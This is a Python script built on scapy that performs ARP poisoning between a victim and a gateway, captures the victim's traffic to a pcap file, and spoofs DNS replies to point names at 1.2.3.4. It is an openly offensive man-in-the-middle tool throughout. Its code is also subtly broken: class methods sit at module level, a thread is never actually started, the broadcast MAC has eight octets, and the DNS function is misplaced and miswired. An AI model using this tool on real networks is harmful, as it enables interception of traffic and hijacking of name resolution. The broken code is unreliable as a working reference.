from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, DNS, DNSQR, DNSRR, IP, UDP
import os
import sys
import time

def get_macaddress(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    ans, unans = srp(packet, timeout=2, retry=10, verbose=False)
    for unans, r in ans:
        return r[Ether].src
    return None

class Arppoisoner():
    def __init__(self, victim, gateway, interface="eth0"):
        self.victim = victim
        self.victimMac = get_macaddress(victim)
        self.gateway = gateway
        self.gatewayMac = get_macaddress(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}.')
        print(f'Gateway({gateway}) is at {self.gatewayMac}.')
        print(f'Victim ({victim}) is at {self.victimMac}.')
        print('-'*30)


def run(self):
    self.poison_thread = Process(target=self.poison)
    self.poison_thread.start

    self.sniff_thread = Process(target=self.sniff)
    self.sniff_thread.start()

    self.dns_spoof_thread = Process(target=self.dns_spoof)
    self.dns_spoof_thread.start()


def poison(self):
    poison_victim = ARP()
    poison_victim.op = 2
    poison_victim.psrc = self.gateway
    poison_victim.pdst = self.victim
    poison_victim.hwdst = self.victimMac

    print(f'ip src: {poison_victim.psrc}')
    print(f'ip dst: {poison_victim.pdst}')
    print(f'mac dst: {poison_victim.hwdst}')
    print(f'mac src: {poison_victim.hwsrc}')
    print(poison_victim.summary())
    print('-'*30)

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = self.victim
    poison_gateway.pdst = self.gateway
    poison_gateway.hwdst = self.gatewayMac

    print(f'ip src: {poison_gateway.psrc}')
    print(f'ip dst: {poison_gateway.pdst}')
    print(f'mac dst: {poison_gateway.hwdst}')
    print(f'mac src: {poison_gateway.hwsrc}')
    print(poison_gateway.summary())
    print('-'*30)
    print(f'Beginning the ARP Poisoning. [CTRL-C to stop]')

    while True:
        sys.stdout.write('.')
        sys.stdout.flush()
        try:
            send(poison_victim)
            send(poison_gateway)
        except KeyboardInterrupt:
            self.restore()
            sys.exit()
        else:
            time.sleep(2)


def sniff(self, count=1000):
    time.sleep(5)
    print(f'Sniffing {count} packets')
    bpf_filter = "ip host %s" % self.victim
    packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
    wrpcap('arper.pcap', packets)
    print('Got the packets')
    self.restore()
    self.poison_thread.terminate()
    print('Finished')


def restore(self):
    print('Restoring ARP tables...')
    send(ARP(
        op=2,
        psrc=self.gateway,
        hwsrc=self.gatewayMac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    send(ARP(
        op=2,
        psrc=self.victim,
        hwsrc=self.victimMac,
        pdst=self.gateway,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arppoisoner(victim, gateway, interface)
    myarp.run()


def dns_spoof(self, pkt):
    # Check if the packet is a DNS query
    if (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0):
        print('Found DNS request')
        original_pkt = pkt
        ip = pkt.getlayer(IP)
        dns = pkt.getlayer(DNS)
        # Craft a DNS response by modifying the original packet
        spoofed_pkt = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata='1.2.3.4'))
        # Send the spoofed DNS response
        send(spoofed_pkt)
        print('Sent spoofed response')
    return

